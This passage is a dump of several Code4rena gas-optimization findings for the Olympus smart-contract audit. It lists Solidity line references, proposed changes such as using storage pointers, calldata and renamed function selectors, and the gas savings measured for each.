more expensive to read from and to return and a `memory` on the other hand is more expensive to create but cheaper to read from and to return. We can optimize with trials and errors instead of complex calculations (which will probably work a bit better, but it's not done here).  Following this, we can deduce 7 cases that can be swapped to optimize runtime cost and deployment cost: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L379 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L179 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L206 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L206 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L385 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L440 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L666  Consider changing `memory` to `storage` in these lines  With these changes, these evolutions in gas average report can be observed:      Kernel: Deployment:  1473364->1456343 (-17021)     OlympusRange: Deployment:   1125279 -> 1121272 (-4007)     OlympusRange: spread: 655 -> 545 (-110)     BondCallback: Deployment: 1408325 ->  1391912  (-16413)     BondCallback: amountsForMarket: 1921 -> 1669 (-252)     OlympusGovernance: Deployment: 1638243 -> 1596194 (-42049)     OlympusGovernance: activateProposal: 52753 -> 51723 (-1030)     Operator: Deployment: 4679925 -> 4566769 (-113156)     Operator: fullCapacity: 5237 -> 5182 (-55)     Operator: initialize: 316017 -> 315911 (-106)     Operator: operate: 122263 -> 118511 (-3752)     Operator: regenerate: 17622 -> 17593 (-29)     ModuleTestFixture :Deployment: 422065 -> 399069 (-22996)    ## [G-08] Using `calldata` instead of `memory` for read only argument in external function If a function parameter is read only, it is cheaper in gas to use `calldata` instead of `memory`.  4 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L152 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53  Consider changing `memory` to `calldata` in these lines/  With these changes, these evolutions in gas average report can be observed:      OlympusPrice: Deployment: 1117743 -> 1101930 (-15813)     OlympusPrice: initialize: 432495 -> 430562 (-1933)     BondCallback: Deployment: 1408325 -> 1386305 (-22020)     BondCallback: batchToTreasury: 12729 -> 12543 (-186)     OlympusPriceConfig: initialize: 491657 -> 486274 (-5383)     TreasuryCustodian: Deployment: 739696 -> 719277 (-20419)     TreasuryCustodian: revokePolicyApprovals: 6956 -> 6842 (-114)  # Medium effect in use ## [G-09] `external` function for the admin can be marked as `payable`  If a function is guaranteed to revert when called by a normal user, this function can be marked as `payable` to avoid the check to know if a payment is provided.  2 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451  Consider adding `payable` keyword.  *Save 21 gas cost*  # High effect on readability  ## [G-10] Optimise function name Every function have a keccak256 hash, this hash defines the order of the function in the contract. The best the ranking, the minimum the gas usage to access the function. Each time a function is called, the EVM need to pass through all the functions better ranked (going through a function cost 22 gas), and this operation cost gas. This can be optimized, the ranking is defined by the first four bytes of the kekkack256 hash of the function name. The name can be changed to improve the ranking, which greatly impacts the readability. That's why it's not practical to change all the names, but it's possible to change only the ones of the functions called a lot of times. This change can be done on the following functions according to their number of uses in the tests and their current ranking.  1. `Kernel.sol`: f166d9eb - `modulePermissions(bytes5,address,bytes4)` **Must outrank:** 000dd95d - `moduleDependents(bytes5,uint256)` **New name:** 00097fbb - `modulePermissions_1055(bytes5,address,bytes4)` **Rank:** 14 -> 1 *Save 286 gas each call*  2. `Kernel.sol`: c4d1f8f1 -  `executeAction(uint8,address)` **Must outrank:** 000dd95d - `moduleDependents(bytes5,uint256)` **New name:** 000a8da2 - `executeAction_11563(uint8,address)` **Rank:** 11 -> 2 *Save 198 gas each call*  3. `MINTR.sol`: 1ae7ec2e -  `KEYCODE()` **Must outrank:** 02b1d239 - `ohm()` **New name:** 00906b26 - `KEYCODE_342()` **Rank:** 2-> 1 *Save 22 gas each call*  4. `RANGE.sol`: bf30142b - `capacity(bool)` **Must outrank:** 00d16739 - `regenerate(bool,uint256)` **New name:** 00e60c55 - `capacity_81(bool)` **Rank:** 14 -> 1 *Save 286 gas each call*  5. `TRSRY.sol`: 1ae7ec2e -  `KEYCODE()` **Must outrank:** 15226b54 - `getReserveBalance(address)` **New name:** 00906b26 - `KEYCODE_342()` **Rank:** 2-> 1 *Save 22 gas each call*  6. `VOTE.sol`: 1ae7ec2e - `KEYCODE()` **Must outrank:** 06fdde03 - `name()` **New name:** 00906b26 - `KEYCODE_342()` **Rank:** 3 -> 1 *Save 44 gas each call*  7. `Governance.sol`: d1755067 - `endorseProposal(uint256)` **Must outrank:** 01153876 - `proposalHasBeenActivated(uint256)` **New name:** 007fedae - `endorseProposal_861(uint256)` **Rank:** 22 -> 1 *Save 462 gas each call*  8. `Governance.sol`: 9459b875 - `configureDependencies()` **Must outrank:** 01153876 - `proposalHasBeenActivated(uint256)` **New name:** 00aced39 - `configureDependencies_1382()` **Rank:** 18 -> 2 *Save gas each call*  9. `Operator.sol`: 7159a618 - `operate()` **Must outrank:** 01de9ba8 - `setReserveFactor(uint32)` **New name:** 000b8875 - `operate_53()` **Rank:** 18 -> 1 *Save 352 gas each call*  10. `Operator.sol`: ec7404b1 - `setActiveStatus(bool)` **Must outrank:** 01de9ba8 - `setReserveFactor(uint32)` **New name:** 00d3138f - `setActiveStatus_78(bool)` **Rank:** 31 -> 2 *Save 638 gas each call*  Consider optimizing these function names."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/44", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "| | issue | | ----------- | ----------- | | 1 | [`<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (same with -= )](#1-x--y-costs-more-gas-than-x--x--y-for-state-variables-same-with) | | 2 | [can make the variable outside the loop to save gas](#2-can-make-the-variable-outside-the-loop-to-save-gas) | | 3 | [`++i` costs less gas than `i++`, especially when it\u2019s used in for-loops (--i/i-- too)](#3-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too) | | 4 | [it costs more gas to initialize non-constant/non-immutable variables to zero than to let the default of zero be applied](#4-it-costs-more-gas-to-initialize-non-constantnon-immutable-variables-to-zero-than-to-let-the-default-of-zero-be-applied) | | 5 | [using `calldata` instead of `memory` for read-only arguments in external functions saves gas](#5-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas) | | 6 | [using `bools` for storage incurs overhead](#6-using-bools-for-storage-incurs-overhead) | | 7 | [internal functions only called once can be inlined to save gas](#7-internal-functions-only-called-once-can-be-inlined-to-save-gas) | | 8 | [usage of uint/int smaller than 32 bytes (256 bits) incurs overhead](#8-usage-of-uintint-smaller-than-32-bytes-256-bits-incurs-overhead) | | 9 | [using private rather than public for constants, saves gas](#9-using-private-rather-than-public-for-constants-saves-gas) | | 10 | [not using the named return variables when a function returns, wastes deployment gas](#10-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas) | | 11 | [state variables only set in the constructor should be declared](#11-state-variables-only-set-in-the-constructor-should-be-declared) | | 12 | [`<array>.length` should not be looked up in every loop of a for-loop](#12-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop) |    ## 1. `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (same with -= )  - [PRICE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136) - [PRICE.sol#L138](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138) - [PRICE.sol#L222](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222)  - [TRSRY.sol#L96](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96) - [TRSRY.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97) - [TRSRY.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115) - [TRSRY.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116) - [TRSRY.sol#L131](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131) - [TRSRY.sol#L132](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L132)  - [VOTES.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L56) - [VOTES.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58)  - [Governance.sol#L198](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198) - [Governance.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252) - [Governance.sol#L254](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  - [BondCallback.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143) - [BondCallback.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144)  - [Heart.sol#L103](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103)   ## 2. can make the variable outside the loop to save gas  - [KernelUtils.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L44) - [KernelUtils.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L59)   ## 3. `++i` costs less gas than `i++`, especially when it\u2019s used in for-loops (--i/i-- too)  Saves 6 gas per loop  - [KernelUtils.sol#L49](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49) - [KernelUtils.sol#L64](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64)  - [Operator.sol#L488](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488) - [Operator.sol#L670](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670) - [Operator.sol#L675](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L675) - [Operator.sol#L686](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686) - [Operator.sol#L691](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L691)   ## 4. it costs more gas to initialize non-constant/non-immutable variables to zero than to let the default of zero be applied  - [Kernel.sol#L397](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L397)  - [KernelUtils.sol#L43](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L44) - [KernelUtils.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L59)   ## 5. using `calldata` instead of `memory` for read-only arguments in external functions saves gas  - [PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205)  - [Governance.sol#L159](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L159)  - [PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45)  - [TreasuryCustodian.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53)  - [BondCallback.sol#L152](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L152)   ## 6. using `bools` for storage incurs overhead  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past  - [PRICE.sol#L62](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L62)  - [RANGE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L127) - [RANGE.sol#L184](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L184) - [RANGE.sol#L216](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L216) - [RANGE.sol#L281](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L281) - [RANGE.sol#L291](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L291) - [RANGE.sol#L302](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L302) - [RANGE.sol#L320](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L320) - [RANGE.sol#L330](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L330) - [RANGE.sol#L340](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L340)  - [Kernel.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L113) - [Kernel.sol#L126](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L126) - [Kernel.sol#L181](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L181) - [Kernel.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L194) - [Kernel.sol#L197](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L197) - [Kernel.sol#L394](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L394)  - [Governance.sol#L105](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L105) - [Governance.sol#L117](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L117) - [Governance.sol#L240](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240)  - [BondCallback.sol#L24](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L24)  - [Heart.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L33)  - [Operator.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L63) - [Operator.sol#L66](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L66) - [Operator.sol#L363](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L363) - [Operator.sol#L473](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L473) - [Operator.sol#L618](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L618) - [Operator.sol#L634](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L634) - [Operator.sol#L699](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L699) - [Operator.sol#L732](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L732) - [Operator.sol#L735](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L735) - [Operator.sol#L778](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L778)   ## 7. internal functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  - [Kernel.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L266) - [Kernel.sol#L279](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L279) - [Kernel.sol#L295](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L295) - [Kernel.sol#L325](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325) - [Kernel.sol#L351](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L351) - [Kernel.sol#L378](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L378) - [Kernel.sol#L409](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L409)  - [Heart.sol#L111](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L111)  - [Operator.sol#L652](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L652)   ## 8. usage of uint/int smaller than 32 bytes (256 bits) incurs overhead  When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  - [PRICE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44) - [PRICE.sol#L47](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47) - [PRICE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127) - [PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185) - [PRICE.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50) - [PRICE.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53) - [PRICE.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56) - [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59) - [PRICE.sol#L75](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75) - [PRICE.sol#L76](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L76) - [PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205) - [PRICE.sol#L240](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240) - [PRICE.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266) - [PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185) - [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59) - [PRICE.sol#L84](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84) - [PRICE.sol#L87](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87)  - [PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45) - [PriceConfig.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58) - [PriceConfig.sol#L69](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69)  - [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89) - [Operator.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97) - [Operator.sol#L516](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516) - [Operator.sol#L528](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528) - [Operator.sol#L529](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L529) - [Operator.sol#L530](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L530) - [Operator.sol#L548](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548) - [Operator.sol#L560](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560) - [Operator.sol#L561](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L561) - [Operator.sol#L562](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L562) - [Operator.sol#L665](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665) - [Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83) - [Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86) - [Operator.sol#L418](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418)   ## 9. using private rather than public for constants, saves gas  If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that returns a tuple of the values of all currently-public constants. Saves 3406-3606 gas in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it\u2019s used, and not adding another entry to the method ID table  - [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59)  - [RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65)  - [Governance.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121) - [Governance.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124) - [Governance.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127) - [Governance.sol#L130](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130) - [Governance.sol#L133](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133) - [Governance.sol#L137](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137)  - [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89)   ## 10. not using the named return variables when a function returns, wastes deployment gas  - [INSTR.sol#L28](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28)  - [MINTR.sol#L25](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25)  - [PRICE.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113)  - [Kernel.sol#L100](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100)  - [TRSRY.sol#L51](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51)  - [RANGE.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115)  - [VOTES.sol#L27](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27)  - [BondCallback.sol#L177](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L177)   ## 11. state variables only set in the constructor should be declared   avoids a gsset (20000 gas)  - [Heart.sol#L48](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L48)  - [BondCallback.sol#L28](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L28) - [BondCallback.sol#L32](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32)   ## 12. `<array>.length` should not be looked up in every loop of a for-loop  This reduce gas cost as show here https://forum.openzeppelin.com/t/a-collection-of-gas-optimisation-tricks/19966/5  - [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "##### Summary  Gas savings are estimated using the gas report of existing `FORGE_GAS_REPORT=true forge test` tests (the sum of all deployment costs and the sum of the costs of calling all methods) and may vary depending on the implementation of the fix. I keep my version of the fix for each finding and can provide them if you need. Some optimizations (mostly logical) cannot be scored with a exact gas quantity.  Gas Optimizations ||Issue|Instances|Estimated gas(deployments)|Estimated gas(method call)| |:---:|:---|:---:|:---:|:---:| |**1**|Replace `modifier` with `function`|6|460 154|-| |**2**|`storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping`|7|188 639|5 032| |**3**|Using `private` rather than `public` for constants, saves gas|8|45 857|308| |**4**|Use elementary types or a user-defined `type` instead of a `struct` that has only one member|1|30 714|1 037| |**5**|State variables should be cached in stack variables rather than re-reading them from storage|7|24 021|614| |**6**|Using bools for storage incurs overhead|6|23 611|4 485| |**7**|State variables can be packed into fewer storage slots|3|23 292|1 711| |**8**|Expressions that cannot be overflowed can be unchecked|5|23 016|-| |**9**|Increment optimization|18|\u2193|\u2193| |**9.1**|Prefix increments are cheaper than postfix increments, especially when it's used in for-loops|3|400|-| |**9.2**|`<x> = <x> + 1` even more efficient than pre increment|18|14 217|-| |**10**|Use named `returns` for local variables where it is possible|3|5 400|-| |**11**|`x = x + y` is cheaper than `x += y;`|6|5 000|-| |**12**|Deleting a struct is cheaper than creating a new struct with null values.|1|4 207|-| |**13**|Don't compare boolean expressions to boolean literals|2|1 607|-| |**14**|`revert` operator should be in the code as early as reasonably possible|3|200|1 559+| |**15**|Duplicated require()/revert() checks should be refactored to a modifier or function|4|-|8 111|  **Total: 83 instances over 15 issues**  ---  1. **Replace `modifier` with `function` (6 instances)**     modifiers make code more elegant, but cost more than normal functions     Deployment Gas Saved: **460 154**     All modifiers except `permissioned` due to unresolved error flow     - src/Kernel.sol:[70-73](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L70-L73), [119-123](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L119-L123), [223-232](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L223-L232)     ```solidity    70     modifier onlyKernel() {    71         if (msg.sender != address(kernel)) revert KernelAdapter_OnlyKernel(msg.sender);    72         _;    73     }    ...    119    modifier onlyRole(bytes32 role_) {    120        Role role = toRole(role_);    121        if (!kernel.hasRole(msg.sender, role)) revert Policy_OnlyRole(role);    122        _;    123    }    ...    223    modifier onlyExecutor() {    224        if (msg.sender != executor) revert Kernel_OnlyExecutor(msg.sender);    225        _;    226    }    227    228    /// @notice Modifier to check if caller is the roles admin.    229    modifier onlyAdmin() {    230        if (msg.sender != admin) revert Kernel_OnlyAdmin(msg.sender);    231        _;    232    }    ```     - src/policies/Operator.sol:[188-191](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191)     ```solidity    188    modifier onlyWhileActive() {    189        if (!active) revert Operator_Inactive();    190        _;    191    }    ```     - [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)     ```solidity    if (!initialized) revert Price_NotInitialized(); // @note 4 instances    ```  2. **`storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` (7 instances)**     Deployment Gas Saved: **188 639**    Method Call Gas Saved: **5 032**     It may not be obvious, but every time you copy a storage `struct`/`array`/`mapping` to a `memory` variable, you are literally copying each member by reading it from `storage`, which is expensive. And when you use the `storage` keyword, you are just storing a pointer to the storage, which is much cheaper.     - src/Kernel.sol:[379](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L379)     ```solidity    379        Policy[] memory dependents = moduleDependents[keycode_];    ```     fix(the same for others):     ```solidity    Policy[] storage dependents = moduleDependents[keycode_];    ```     - src/policies/BondCallback.sol:[179](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L179)     ```solidity    179        uint256[2] memory marketAmounts = _amountsPerMarket[id_];    ```     - src/policies/Governance.sol:[206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L206)     ```solidity    206        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];    ```     - src/policies/Operator.sol:[205-206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L205-L206), [384-385](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L384-L385), [439-440](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L439-L440), [666](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L666)     ```solidity    205        /// Cache config in memory    206        Config memory config_ = _config;    ...    384            /// Cache config struct to avoid multiple SLOADs    385            Config memory config_ = _config;    ...    439            /// Cache config struct to avoid multiple SLOADs    440            Config memory config_ = _config;    ...    666        Regen memory regen = _status.low;    ```  3. **Using `private` rather than `public` for constants, saves gas (8 instances)**     If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table     Deployment Gas Saved: **45 857**    Method Call Gas Saved: **308**     - src/policies/Governance.sol:[119-137](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L119-L137)     ```solidity    119    /// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).    120    /// @dev    This is set to 1% of the total supply.    121    uint256 public constant SUBMISSION_REQUIREMENT = 100;    122    123    /// @notice Amount of time a submitted proposal has to activate before it expires.    124    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;    125    126    /// @notice Amount of time an activated proposal must stay up before it can be replaced 